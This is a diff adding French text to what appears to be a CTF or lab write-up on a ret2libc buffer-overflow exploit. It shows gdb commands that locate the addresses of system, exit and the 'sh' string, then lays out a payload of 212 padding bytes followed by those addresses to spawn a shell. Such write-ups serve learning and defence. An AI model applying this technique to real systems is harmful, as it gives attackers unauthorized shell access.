@@ -221,3 +221,21 @@ $1 = {<text variable, no debug info>} 0xf7e4c060 <system>
 p exit
 $2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
 ```
+
+De plus il nous faut l'adresse de la chaine sh pour exécuter un shell :
+
+```py
+(gdb) find &system,+9999999,"sh"
+  0xf7f6ddd5
+(gdb) x/s 0xf7f6ddd5
+  0xf7f6ddd5:	"sh"
+```
+
+Globalement, sh va être passé en argument à la fonction system.
+
+Notre payload va alors ressembler à ceci : `212 octets + Adresse System + Adresse Exit + Adresse SH`
+
+Pour illustrer notre payload :
+
+[payload_schema](https://i.imgur.com/KtbdNeN.png)
+
